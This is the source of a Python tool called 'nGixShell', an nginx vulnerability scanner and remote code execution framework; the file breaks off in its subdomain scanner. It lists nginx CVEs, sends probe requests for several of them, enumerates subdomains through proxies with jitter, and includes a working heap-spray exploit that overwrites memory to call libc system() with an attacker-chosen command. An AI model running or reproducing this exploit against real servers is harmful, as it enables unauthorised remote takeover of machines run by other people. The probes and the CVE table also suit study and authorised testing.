#!/usr/bin/env python3
"""
nGixShell — nginx CVE scanner + RCE exploit framework
CVE-2026-42945 heap overflow + 16 other nginx vulnerabilities.
"""

BANNER = r"""
╔════════════════════════════════════════════════════════╗
║          _______      _____ __         ____            ║
║   ____  / ____(_)  __/ ___// /_  ___  / / /           ║
║  / __ \/ / __/ / |/_/\__ \/ __ \/ _ \/ / /            ║
║ / / / / /_/ / />  < ___/ / / / /  __/ / /             ║
║/_/ /_/\____/_/_/|_|/____/_/ /_/\___/_/_/              ║
╠════════════════════════════════════════════════════════╣
║  nginx CVE Scanner + RCE Exploit Framework             ║
║  17 CVEs  ·  CVE-2026-42945  ·  by Mateus Veras        ║
╚════════════════════════════════════════════════════════╝
"""
import argparse
import base64
import datetime
import json
import random
import re
import select
import socket
import ssl
import struct
import sys
import threading
import time
from collections import OrderedDict
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

# ─── Safe-byte filter (NGX_ESCAPE_ARGS bitmask from nginx source) ─────────────
SAFE = set()
_t = [0xffffffff, 0xd800086d, 0x50000000, 0xb8000001,
      0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff]
for _b in range(256):
    if not (_t[_b >> 5] & (1 << (_b & 0x1f))):
        SAFE.add(_b)

# ─── Exploit constants (Docker image, ASLR disabled) ─────────────────────────
HEAP_BASE        = 0x555555659000
LIBC_BASE        = 0x7ffff77ba000
SYSTEM_ADDR      = LIBC_BASE + 0x50d70
FAKE_STRUCT_SIZE = struct.calcsize('<QQQ')

PREREAD_HEAP_OFFSETS = [
    0x05a427, 0x060e67,
    0x0ba557, 0x0bf367, 0x0c4177, 0x0c8f87, 0x0cdd97,
    0x0d2ba7, 0x0d79b7, 0x0dc7c7, 0x0e15d7, 0x0e63e7,
    0x0eb1f7, 0x0f0007, 0x0f4e17, 0x0f9c27, 0x0fea37,
    0x103847, 0x108657, 0x10d467,
]

VULN_MIN = (0, 6, 27)
VULN_MAX = (1, 30, 0)

COMMON_SUBDOMAINS = [
    "www", "mail", "ftp", "api", "dev", "test", "staging", "app", "admin",
    "blog", "shop", "cdn", "static", "media", "assets", "images", "img",
    "upload", "downloads", "secure", "vpn", "remote", "portal", "login",
    "auth", "oauth", "sso", "payment", "checkout", "store", "m", "mobile",
    "beta", "demo", "dashboard", "status", "monitor", "metrics", "grafana",
    "jenkins", "gitlab", "git", "svn", "jira", "confluence", "wiki", "docs",
    "help", "support", "kb", "forum", "community", "chat", "news", "press",
    "careers", "jobs", "hr", "intranet", "internal", "corp", "office",
    "backup", "db", "database", "redis", "elastic", "search", "proxy",
    "gateway", "lb", "ha", "k8s", "docker", "registry", "ci", "cd",
    "build", "deploy", "prod", "uat", "qa", "sandbox", "lab", "data",
    "analytics", "bi", "reporting", "mq", "kafka", "ws", "websocket",
    "ns1", "ns2", "smtp", "webmail", "autodiscover", "cpanel", "panel",
    "externo", "external", "ext", "public", "open", "access", "v2", "v1",
    "api2", "api3", "old", "new", "legacy", "cloud", "aws", "azure",
]

# ─── CVE Database ─────────────────────────────────────────────────────────────
CVE_DB = OrderedDict([
    ("CVE-2026-42945", {
        "description": "Heap overflow in ngx_http_rewrite_module via URI percent-encoding mismatch (RCE)",
        "cvss": 9.8, "severity": "CRITICAL",
        "affected_min": (0, 6, 27), "affected_max": (1, 30, 0),
        "fixed_in": "1.31.0 / 1.30.1",
        "config_required": ["rewrite", "set"],
        "local_only": False, "probe": None, "exploit": True,
        "ref": "https://my.f5.com/manage/s/article/K000160932",
    }),
    ("CVE-2026-42946", {
        "description": "Memory corruption in nginx rewrite engine (sibling of CVE-2026-42945)",
        "cvss": 8.1, "severity": "HIGH",
        "affected_min": (0, 6, 27), "affected_max": (1, 30, 0),
        "fixed_in": "1.31.0 / 1.30.1",
        "config_required": ["rewrite"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://my.f5.com/manage/s/article/K000160932",
    }),
    ("CVE-2026-40701", {
        "description": "Memory corruption in nginx request processing (sibling of CVE-2026-42945)",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (0, 6, 27), "affected_max": (1, 30, 0),
        "fixed_in": "1.31.0 / 1.30.1",
        "config_required": [],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://my.f5.com/manage/s/article/K000160932",
    }),
    ("CVE-2026-42934", {
        "description": "Memory corruption in nginx (sibling of CVE-2026-42945, same advisory)",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (0, 6, 27), "affected_max": (1, 30, 0),
        "fixed_in": "1.31.0 / 1.30.1",
        "config_required": [],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://my.f5.com/manage/s/article/K000160932",
    }),
    ("CVE-2022-41741", {
        "description": "Memory corruption in ngx_http_mp4_module via malicious mp4 file (RCE)",
        "cvss": 7.8, "severity": "HIGH",
        "affected_min": (1, 1, 3), "affected_max": (1, 23, 1),
        "fixed_in": "1.23.2 / 1.22.1",
        "config_required": ["mp4"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2022-41742", {
        "description": "Heap memory disclosure in ngx_http_mp4_module via malicious mp4 file",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (1, 1, 3), "affected_max": (1, 23, 1),
        "fixed_in": "1.23.2 / 1.22.1",
        "config_required": ["mp4"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2021-23017", {
        "description": "Off-by-one in DNS resolver allows 1-byte heap overwrite (potential RCE)",
        "cvss": 7.7, "severity": "HIGH",
        "affected_min": (0, 6, 18), "affected_max": (1, 20, 0),
        "fixed_in": "1.20.1",
        "config_required": ["resolver"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2017-7529", {
        "description": "Integer overflow in range filter allows out-of-bounds memory read",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (0, 5, 6), "affected_max": (1, 13, 2),
        "fixed_in": "1.13.3 / 1.12.1",
        "config_required": [],
        "local_only": False, "probe": "probe_range_overflow", "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2016-1247", {
        "description": "Privilege escalation via log file symlink attack (local, packaging issue)",
        "cvss": 7.8, "severity": "HIGH",
        "affected_min": (0, 0, 0), "affected_max": (1, 10, 0),
        "fixed_in": "1.10.1 (distro-specific)",
        "config_required": [],
        "local_only": True, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2013-4547", {
        "description": "Space + NUL byte in URI bypasses location access restrictions",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (0, 8, 41), "affected_max": (1, 5, 6),
        "fixed_in": "1.5.7 / 1.4.4",
        "config_required": [],
        "local_only": False, "probe": "probe_uri_space", "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2013-2028", {
        "description": "Stack-based buffer overflow in chunked transfer encoding (RCE)",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (1, 3, 9), "affected_max": (1, 4, 0),
        "fixed_in": "1.4.1",
        "config_required": [],
        "local_only": False, "probe": "probe_chunked", "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2012-2089", {
        "description": "Buffer overflow in ngx_http_mp4_module via malicious mp4 request",
        "cvss": 6.8, "severity": "MEDIUM",
        "affected_min": (1, 0, 7), "affected_max": (1, 1, 3),
        "fixed_in": "1.1.19 / 1.0.15",
        "config_required": ["mp4"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2019-20372", {
        "description": "HTTP request smuggling via error_page + proxy_pass configuration",
        "cvss": 5.3, "severity": "MEDIUM",
        "affected_min": (0, 0, 0), "affected_max": (1, 17, 6),
        "fixed_in": "1.17.7",
        "config_required": ["error_page", "proxy_pass"],
        "local_only": False, "probe": "probe_smuggling", "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2014-3616", {
        "description": "Virtual host confusion via TLS SNI — wrong certificate may be served",
        "cvss": 4.3, "severity": "MEDIUM",
        "affected_min": (0, 0, 0), "affected_max": (1, 7, 3),
        "fixed_in": "1.7.4",
        "config_required": ["ssl", "server_name"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2011-4963", {
        "description": "ngx_http_access_module bypass via IPv6 address literal in Host header",
        "cvss": 5.0, "severity": "MEDIUM",
        "affected_min": (0, 0, 0), "affected_max": (1, 1, 18),
        "fixed_in": "1.1.19 / 1.0.14",
        "config_required": ["deny", "allow"],
        "local_only": False, "probe": "probe_ipv6_bypass", "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2009-3896", {
        "description": "NULL pointer dereference via crafted request — remote crash (DoS)",
        "cvss": 5.0, "severity": "MEDIUM",
        "affected_min": (0, 0, 0), "affected_max": (0, 8, 31),
        "fixed_in": "0.8.32 / 0.7.64",
        "config_required": [],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
    ("CVE-2009-2629", {
        "description": "Buffer underflow in ngx_http_parse_complex_uri() — remote crash/RCE",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (0, 0, 0), "affected_max": (0, 8, 14),
        "fixed_in": "0.8.15 / 0.7.62",
        "config_required": [],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/CHANGES",
    }),
])

# ─── Session globals ──────────────────────────────────────────────────────────
_verbose:       bool  = False
_tmul:          float = 1.0
_log_fh               = None
_log_lock             = threading.Lock()
_user_agent:    str   = "nGixShell/1.0"
_extra_headers: dict  = {}
_jitter_ms:     float = 0.0
_retry_count:   int   = 1
_rate_limiter         = None


# ─── Rate limiter ─────────────────────────────────────────────────────────────

class RateLimiter:
    def __init__(self, rps: float):
        self._interval = 1.0 / rps
        self._lock     = threading.Lock()
        self._next     = 0.0

    def acquire(self) -> None:
        with self._lock:
            now  = time.monotonic()
            wait = self._next - now
            if wait > 0:
                time.sleep(wait)
            self._next = time.monotonic() + self._interval


# ─── I/O helpers ──────────────────────────────────────────────────────────────

def log(msg: str) -> None:
    with _log_lock:
        print(msg)
        if _log_fh is not None:
            _log_fh.write(msg + "\n")
            _log_fh.flush()


def vlog(msg: str) -> None:
    if _verbose:
        log(msg)


def _sleep(seconds: float) -> None:
    total = seconds * _tmul
    if _jitter_ms > 0:
        total += random.uniform(0, _jitter_ms / 1000.0)
    time.sleep(total)


# ─── HTTP helpers ─────────────────────────────────────────────────────────────

def _build_headers(host: str, extra: dict = None) -> dict:
    h = {"Host": host, "User-Agent": _user_agent, "Connection": "close"}
    h.update(_extra_headers)
    if extra:
        h.update(extra)
    return h


def _headers_to_wire(h: dict) -> bytes:
    return b"".join(f"{k}: {v}\r\n".encode("latin-1") for k, v in h.items())


# ─── Network helpers ──────────────────────────────────────────────────────────

def _connect_socks5(host: str, port: int, proxy_host: str,
                    proxy_port: int, timeout: float) -> socket.socket:
    s = socket.create_connection((proxy_host, proxy_port), timeout=timeout)
    s.sendall(b"\x05\x01\x00")
    resp = s.recv(2)
    if len(resp) < 2 or resp[0] != 5 or resp[1] != 0:
        s.close()
        raise ConnectionError(f"SOCKS5 auth failed: {resp!r}")
    host_enc = host.encode("idna")
    s.sendall(b"\x05\x01\x00\x03" + bytes([len(host_enc)]) + host_enc + struct.pack(">H", port))
    hdr = s.recv(4)
    if len(hdr) < 4 or hdr[1] != 0:
        s.close()
        raise ConnectionError(f"SOCKS5 connect rejected: REP=0x{hdr[1]:02x}")
    atyp = hdr[3]
    if atyp == 1:   s.recv(6)
    elif atyp == 3: s.recv(s.recv(1)[0] + 2)
    elif atyp == 4: s.recv(18)
    return s


def _connect(host: str, port: int, timeout: float = 5.0,
             tls: bool = False, proxy: str = None) -> socket.socket:
    if proxy:
        p      = urlparse(proxy)
        scheme = p.scheme.lower()
        ph, pp = p.hostname, p.port or (1080 if "socks" in scheme else 8080)
        if scheme in ("socks5", "socks5h"):
            s = _connect_socks5(host, port, ph, pp, timeout)
        else:
            s = socket.create_connection((ph, pp), timeout=timeout)
            s.sendall(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode())
            resp = b""
            while b"\r\n\r\n" not in resp:
                chunk = s.recv(4096)
                if not chunk: break
                resp += chunk
            if b" 200 " not in resp:
                s.close()
                raise ConnectionError(f"Proxy CONNECT failed: {resp[:80]!r}")
    else:
        s = socket.create_connection((host, port), timeout=timeout)

    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
    return s


def _http_head(host: str, port: int, path: str = "/",
               tls: bool = False, proxy: str = None,
               timeout: float = 5.0) -> dict:
    if _rate_limiter:
        _rate_limiter.acquire()
    s   = _connect(host, port, timeout=timeout, tls=tls, proxy=proxy)
    req = f"HEAD {path} HTTP/1.1\r\n".encode() + _headers_to_wire(_build_headers(host)) + b"\r\n"
    s.sendall(req)
    s.settimeout(timeout)
    raw = b""
    try:
        while b"\r\n\r\n" not in raw:
            chunk = s.recv(4096)
            if not chunk: break
            raw += chunk
    finally:
        s.close()

    headers = {}
    lines   = raw.decode("latin-1", errors="replace").split("\r\n")
    if lines:
        headers["status_line"] = lines[0]
        try:    headers["status_code"] = int(lines[0].split()[1])
        except: headers["status_code"] = 0
    for line in lines[1:]:
        if ":" in line:
            k, _, v = line.partition(":")
            headers[k.strip().lower()] = v.strip()
    return headers


def _auto_detect_tls(host: str, port: int, proxy: str = None) -> bool:
    """Try plain HTTP first; if it fails with SSL error, return True (TLS needed)."""
    try:
        _connect(host, port, timeout=4, tls=False, proxy=proxy).close()
        return False
    except ssl.SSLError:
        return True
    except Exception:
        # Try TLS anyway
        try:
            _connect(host, port, timeout=4, tls=True, proxy=proxy).close()
            return True
        except Exception:
            return False


# ─── Target parser ────────────────────────────────────────────────────────────

def parse_target(target: str, default_port: int = 19321) -> tuple:
    """
    Parse 'host', 'host:port', 'http://host:port', 'https://host:port'.
    Returns (host, port, tls_forced).
    """
    tls_forced = False
    if "://" in target:
        p  = urlparse(target)
        tls_forced = p.scheme.lower() == "https"
        host = p.hostname or "127.0.0.1"
        port = p.port or (443 if tls_forced else 80)
        return host, port, tls_forced

    if target.startswith("["):
        bracket_end = target.find("]")
        host = target[1:bracket_end]
        rest = target[bracket_end + 1:]
        port = int(rest.lstrip(":")) if ":" in rest else default_port
    elif target.count(":") == 1:
        h, p = target.rsplit(":", 1)
        host = h
        port = int(p) if p.isdigit() else default_port
    else:
        host = target
        port = default_port

    return host, port, False


def _parse_target_line(line: str, default_port: int) -> tuple:
    line = line.strip()
    if not line or line.startswith("#"):
        return None, None, None
    return parse_target(line, default_port)


# ─── Version helpers ──────────────────────────────────────────────────────────

def _parse_version(server: str):
    m = re.search(r"nginx/(\d+)\.(\d+)\.(\d+)", server, re.IGNORECASE)
    return tuple(int(x) for x in m.groups()) if m else None


def _version_in_range(v: tuple, vmin: tuple, vmax: tuple) -> bool:
    return vmin <= v <= vmax


# ─── Target fingerprint ───────────────────────────────────────────────────────

def fingerprint_target(host: str, port: int,
                       tls: bool = False, proxy: str = None) -> dict:
    info: dict = {"host": host, "port": port, "tls": tls}
    try:
        headers = _http_head(host, port, tls=tls, proxy=proxy)
        server  = headers.get("server", "")
        info["server_header"] = server
        info["status_code"]   = headers.get("status_code", 0)
        version = _parse_version(server)
        info["version"]       = ".".join(str(x) for x in version) if version else None
        info["version_tuple"] = version
        info["nginx_plus"]    = "nginx-plus" in server.lower()
        info["via"]           = headers.get("via", "")

        if tls:
            try:
                raw = socket.create_connection((host, port), timeout=5)
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                ts  = ctx.wrap_socket(raw, server_hostname=host)
                cert = ts.getpeercert()
                ts.close()
                if cert:
                    subj = dict(x[0] for x in cert.get("subject", []))
                    info["tls_cn"]  = subj.get("commonName", "")
                    info["tls_san"] = [v for _, v in cert.get("subjectAltName", [])]
            except Exception as e:
                vlog(f"[v] TLS cert probe: {e}")

    except Exception as e:
        info["error"] = str(e)

    log(f"\n{'─'*60}")
    log(f"  Fingerprint  {host}:{port}")
    log(f"{'─'*60}")
    log(f"  Server  : {info.get('server_header') or '(none)'}")
    log(f"  Version : {info.get('version') or 'unknown'}")
    log(f"  Plus    : {'yes' if info.get('nginx_plus') else 'no'}")
    if info.get("tls_cn"):
        log(f"  TLS CN  : {info['tls_cn']}")
    if info.get("tls_san"):
        log(f"  TLS SAN : {', '.join(info['tls_san'][:6])}")
    log(f"{'─'*60}")
    return info


# ─── Version check ────────────────────────────────────────────────────────────

def check_target(host: str, port: int,
                 tls: bool = False, proxy: str = None) -> tuple:
    scheme = "https" if tls else "http"
    log(f"[*] Checking {scheme}://{host}:{port} ...")
    try:
        headers = _http_head(host, port, tls=tls, proxy=proxy)
        server  = headers.get("server", "")
        if not server:
            log("[-] No Server header")
            return False, None
        log(f"[+] Server: {server}")
        version = _parse_version(server)
        if version is None:
            log("[-] Not nginx or version not exposed")
            return False, None
        ver_str = ".".join(str(x) for x in version)
        if _version_in_range(version, VULN_MIN, VULN_MAX):
            log(f"[!] nginx {ver_str} — VULNERABLE RANGE "
                f"({'.'.join(str(x) for x in VULN_MIN)}–{'.'.join(str(x) for x in VULN_MAX)})")
            return True, version
        log(f"[-] nginx {ver_str} — not in default vulnerable range")
        return False, version
    except Exception as e:
        log(f"[!] Check failed: {e}")
        return False, None


# ─── Heap helpers ─────────────────────────────────────────────────────────────

def addr_is_safe(addr: int) -> bool:
    return all(((addr >> (j * 8)) & 0xff) in SAFE for j in range(6))


def get_candidates() -> list:
    return [(i, HEAP_BASE + off)
            for i, off in enumerate(PREREAD_HEAP_OFFSETS)
            if addr_is_safe(HEAP_BASE + off)]


def list_candidates() -> None:
    log(f"  {'#':<4} {'OFFSET':<12} {'ADDRESS':<18} SAFE")
    log("  " + "─" * 46)
    for i, off in enumerate(PREREAD_HEAP_OFFSETS):
        addr = HEAP_BASE + off
        log(f"  {i:<4} 0x{off:06x}     0x{addr:012x}     {'yes' if addr_is_safe(addr) else 'NO'}")


def make_body(cmd: str, data_addr: int, body_len: int) -> bytes:
    fake  = struct.pack('<QQQ', SYSTEM_ADDR, data_addr, 0)
    cb    = cmd.encode('utf-8') + b'\x00'
    pl    = fake + cb
    if len(pl) > body_len:
        log(f"[!] Command too long ({len(pl)} > {body_len})")
        sys.exit(1)
    return pl + b'\x41' * (body_len - len(pl))


# ─── CVE probes ───────────────────────────────────────────────────────────────

def probe_range_overflow(host, port, tls, proxy):
    try:
        if _rate_limiter: _rate_limiter.acquire()
        s = _connect(host, port, tls=tls, proxy=proxy, timeout=5)
        s.sendall(b"GET / HTTP/1.1\r\n" + _headers_to_wire(_build_headers(host, {
            "Range": "bytes=0-,9223372036854775807"})) + b"\r\n")
        s.settimeout(5)
        raw = b""
        while b"\r\n" not in raw:
            chunk = s.recv(512)
            if not chunk: break
            raw += chunk
        s.close()
        parts  = raw.decode("latin-1").split()
        status = int(parts[1]) if len(parts) > 1 else 0
        if status == 400:   return False, "400 — patched"
        if status in (416, 200): return False, f"{status} — range ignored"
        return True, f"Status {status} — overflow Range indicator"
    except Exception as e:
        return None, f"probe error: {e}"


def probe_smuggling(host, port, tls, proxy):
    try:
        if _rate_limiter: _rate_limiter.acquire()
        s        = _connect(host, port, tls=tls, proxy=proxy, timeout=6)
        smuggled = b"GET /ngixshell-probe-2 HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n"
        s.sendall(b"GET /ngixshell-probe-1 HTTP/1.1\r\n" + _headers_to_wire(_build_headers(host, {
            "Content-Length": str(len(smuggled)), "Connection": "keep-alive"})) + b"\r\n" + smuggled)
        s.settimeout(3)
        raw = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk: break
                raw += chunk
                if raw.count(b"HTTP/") >= 2: break
        except socket.timeout:
            pass
        s.close()
        if raw.count(b"HTTP/") >= 2:
            return True, "Two HTTP responses — smuggling indicator"
        return False, "Single response"
    except Exception as e:
        return None, f"probe error: {e}"


def probe_chunked(host, port, tls, proxy):
    try:
        if _rate_limiter: _rate_limiter.acquire()
        s = _connect(host, port, tls=tls, proxy=proxy, timeout=5)
        s.sendall(b"POST / HTTP/1.1\r\n" + _headers_to_wire(_build_headers(host, {
            "Transfer-Encoding": "chunked"})) + b"\r\n" + b"7fffffff\r\n")
        s.settimeout(3)
        try:   resp = s.recv(512)
        except socket.timeout: resp = b""
        s.close()
        if not resp: return True, "No response — possible crash"
        parts  = resp.split()
        status = int(parts[1]) if len(parts) > 1 else 0
        if status in (400, 411, 413): return False, f"{status} — patched"
        return None, f"Status {status} — inconclusive"
    except ConnectionResetError:
        return True, "Connection reset — possible crash"
    except Exception as e:
        return None, f"probe error: {e}"


def probe_ipv6_bypass(host, port, tls, proxy):
    try:
        if _rate_limiter: _rate_limiter.acquire()
        baseline = _http_head(host, port, tls=tls, proxy=proxy, timeout=5).get("status_code", 0)
        s = _connect(host, port, tls=tls, proxy=proxy, timeout=5)
        s.sendall(b"GET / HTTP/1.1\r\nHost: [::1]\r\nUser-Agent: " +
                  _user_agent.encode() + b"\r\nConnection: close\r\n\r\n")
        s.settimeout(5)
        raw = b""
        while b"\r\n\r\n" not in raw:
            chunk = s.recv(512)
            if not chunk: break
            raw += chunk
        s.close()
        parts  = raw.decode("latin-1").split()
        status = int(parts[1]) if len(parts) > 1 else 0
        if baseline in (403, 401) and status == 200:
            return True, f"IPv6 literal bypassed access ({baseline}→{status})"
        if status == 400: return False, "400 — patched"
        return None, f"Baseline {baseline} / IPv6 {status} — inconclusive"
    except Exception as e:
        return None, f"probe error: {e}"


def probe_uri_space(host, port, tls, proxy):
    try:
        if _rate_limiter: _rate_limiter.acquire()
        s = _connect(host, port, tls=tls, proxy=proxy, timeout=5)
        s.sendall(b"GET /ngixshell-test%20\x00.txt HTTP/1.0\r\n" +
                  _headers_to_wire(_build_headers(host)) + b"\r\n")
        s.settimeout(5)
        raw = b""
        while b"\r\n\r\n" not in raw:
            chunk = s.recv(512)
            if not chunk: break
            raw += chunk
        s.close()
        parts  = raw.decode("latin-1", errors="replace").split()
        status = int(parts[1]) if len(parts) > 1 else 0
        if status == 400: return False, "400 — patched"
        if status in (200, 403, 404): return True, f"Status {status} — NUL processed (indicator)"
        return None, f"Status {status} — inconclusive"
    except Exception as e:
        return None, f"probe error: {e}"


PROBE_REGISTRY = {
    "probe_range_overflow": probe_range_overflow,
    "probe_smuggling":      probe_smuggling,
    "probe_chunked":        probe_chunked,
    "probe_ipv6_bypass":    probe_ipv6_bypass,
    "probe_uri_space":      probe_uri_space,
}

_SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}


def _run_probe_with_retry(fn, host, port, tls, proxy) -> tuple:
    last = (None, "no result")
    for n in range(max(1, _retry_count)):
        result, msg = fn(host, port, tls, proxy)
        if result is not None:
            return result, msg
        last = result, msg
        if n < _retry_count - 1:
            _sleep(0.5)
    return last


# ─── CVE scanner ──────────────────────────────────────────────────────────────

def list_cves() -> None:
    log(f"\nCVE Database — {len(CVE_DB)} entries")
    log("─" * 102)
    log(f"  {'CVE':<18} {'CVSS':<6} {'SEV':<10} {'AFFECTED RANGE':<24} "
        f"{'PROBE':<6} {'EXPLOIT':<8} FIXED IN")
    log("─" * 102)
    for cve_id, info in CVE_DB.items():
        amin = ".".join(str(x) for x in info["affected_min"])
        amax = ".".join(str(x) for x in info["affected_max"])
        log(f"  {cve_id:<18} {info['cvss']:<6} {info['severity']:<10} "
            f"{amin + ' – ' + amax:<24} "
            f"{'yes' if info['probe'] else 'no':<6} "
            f"{'YES' if info['exploit'] else 'no':<8} {info['fixed_in']}")
    log("─" * 102)


def cve_scan(host: str, port: int, tls: bool = False,
             proxy: str = None, target_cve: str = None,
             version: tuple = None) -> list:
    """Run CVE checks. Pass version tuple if already detected to skip re-check."""
    log(f"\n[*] CVE scan — {host}:{port}")
    log("─" * 96)

    if version is None:
        _, version = check_target(host, port, tls, proxy)

    log("")
    log(f"  {'CVE':<18} {'CVSS':<6} {'SEV':<10} {'STATUS':<20} DESCRIPTION")
    log("─" * 96)

    targets  = ({target_cve: CVE_DB[target_cve]} if target_cve else CVE_DB)
    findings = []

    for cve_id, info in targets.items():
        if info.get("local_only"):
            status = "LOCAL-ONLY"
        elif version is None:
            status = "UNKNOWN"
        elif _version_in_range(version, info["affected_min"], info["affected_max"]):
            probe_name = info.get("probe")
            if probe_name and probe_name in PROBE_REGISTRY:
                result, msg = _run_probe_with_retry(
                    PROBE_REGISTRY[probe_name], host, port, tls, proxy)
                vlog(f"[v] {cve_id}: {msg}")
                status = ("VULNERABLE" if result is True
                          else "PROBE-CLEAN" if result is False
                          else "VERSION-MATCH")
            elif info.get("exploit"):
                status = "EXPLOIT-AVAIL"
            else:
                status = "VERSION-MATCH"
        else:
            status = "PATCHED"

        desc   = info["description"]
        short  = (desc[:57] + "...") if len(desc) > 60 else desc
        marker = ("[!]" if status in ("VULNERABLE", "EXPLOIT-AVAIL")
                  else "[-]" if status in ("PATCHED", "PROBE-CLEAN")
                  else "[?]")

        log(f"  {marker} {cve_id:<16} {info['cvss']:<6} {info['severity']:<10} {status:<20} {short}")

        if status not in ("PATCHED", "LOCAL-ONLY", "PROBE-CLEAN"):
            findings.append((cve_id, info, status))

    log("─" * 96)

    by_sev = {}
    for _, info, _ in findings:
        by_sev[info["severity"]] = by_sev.get(info["severity"], 0) + 1
    sev_str = " | ".join(
        f"{s}: {c}" for s, c in sorted(by_sev.items(), key=lambda x: _SEV_ORDER.get(x[0], 99))
    )
    log(f"\n[+] Potential issues: {len(findings)}  ({sev_str or 'none'})")

    actionable = [(c, i, s) for c, i, s in findings if s in ("VULNERABLE", "EXPLOIT-AVAIL")]
    if actionable:
        log("\n[!] Actionable findings:")
        for cve_id, info, _ in actionable:
            log(f"    {cve_id} ({info['severity']}) — {info['description']}")
            log(f"      Fixed in : {info['fixed_in']}")
            log(f"      Ref      : {info.get('ref', 'N/A')}")
            if info.get("exploit"):
                log(f"      Exploit  : run with --cmd 'id' or --shell")
            if info.get("config_required"):
                log(f"      Requires : {', '.join(info['config_required'])}")

    return findings


# ─── Exploit ──────────────────────────────────────────────────────────────────

def wait_alive(host: str, port: int, timeout: int = 30,
               tls: bool = False, proxy: str = None) -> bool:
    for _ in range(timeout):
        try:
            s = _connect(host, port, timeout=2, tls=tls, proxy=proxy)
            s.sendall(b"GET / HTTP/1.1\r\nHost:l\r\nConnection:close\r\n\r\n")
            s.recv(100)
            s.close()
            return True
        except Exception:
            _sleep(1)
    return False


def attempt(host, port, target_bytes, body, n_spray, body_len, tls, proxy):
    sprays = []
    for i in range(n_spray):
        try:
            s = _connect(host, port, timeout=5, tls=tls, proxy=proxy)
            s.sendall(b"POST /spray HTTP/1.1\r\nHost: l\r\nContent-Length: " +
                      str(body_len).encode() + b"\r\nX-Delay: 60\r\nConnection: close\r\n\r\n" + body)
            sprays.append(s)
        except Exception as e:
            vlog(f"[v] Spray {i}: {e}")
            break
        _sleep(0.005)
    _sleep(0.2)

    try:
        a = _connect(host, port, timeout=5, tls=tls, proxy=proxy); _sleep(0.02)
        v = _connect(host, port, timeout=5, tls=tls, proxy=proxy); _sleep(0.02)
    except Exception as e:
        vlog(f"[v] Trigger open failed: {e}")
        for s in sprays:
            try: s.close()
            except: pass
        return False

    payload = "A" * 349 + "+" * 969 + target_bytes.decode("latin-1")
    a.sendall((f"GET /api/{payload} HTTP/1.1\r\nHost:localhost\r\n").encode("latin-1"))
    _sleep(0.05)
    v.sendall(b"GET / HTTP/1.1\r\nHost:localhost\r\n")
    _sleep(0.05)
    a.sendall(b"X-Delay:60\r\nConnection:close\r\n\r\n")
    _sleep(0.2)
    v.close()
    _sleep(0.1)

    crashed = False
    try:
        a.sendall(b"X-Ping:1\r\n")
        a.settimeout(0.2)
        if not a.recv(1): crashed = True
    except socket.timeout:
        try:
            ck = _connect(host, port, timeout=0.2, tls=tls, proxy=proxy)
            ck.sendall(b"GET / HTTP/1.1\r\nHost:localhost\r\nConnection:close\r\n\r\n")
            crashed = not ck.recv(10)
            ck.close()
        except Exception as e:
            vlog(f"[v] Check conn: {e}")
            crashed = True
    except (ConnectionResetError, BrokenPipeError, OSError) as e:
        vlog(f"[v] Trigger: {e}")
        crashed = True

    for s in sprays:
        try: s.close()
        except: pass
    try: a.close()
    except: pass
    vlog(f"[v] crashed={crashed}")
    return crashed


# ─── Subdomain scanner ────────────────────────────────────────────────────────

def _probe_subdomain(fqdn, port, tls, proxy, timeout):
    try:
        socket.getaddrinfo(fqdn, port, socket.AF_INET)
    except socket.gaierror:
        return None
    try:
        if _rate_limiter: _rate_limiter.acquire()
        headers = _http_head(fqdn, port, tls=tls, proxy=proxy, timeout=timeout)
        server  = headers.get("server", "")
        version = _parse_version(server) if server else None
        vuln    = _version_in_range(version, VULN_MIN, VULN_MAX) if version else False
        return {"host": fqdn, "server": server or "(none)", "version": version, "vulnerable": vuln}
    except Exception as e:
        vlog(f"[v] {fqdn}: {e}")
        return None


def subdomain_scan(domain, wordlist, port=80, tls=False,
                   proxy=None, n_threads=20, timeout=5.0):
    log(f"[*] Subdomain scan: {domain} | {len(wordlist)} words | {n_threads} threads")
    log("─" * 68)
    log(f"  {'STATUS':<10} {'HOST':<42} SERVER")
    log("─" * 68)
    results = []
    with ThreadPoolExecutor(max_workers=n_threads) as ex:
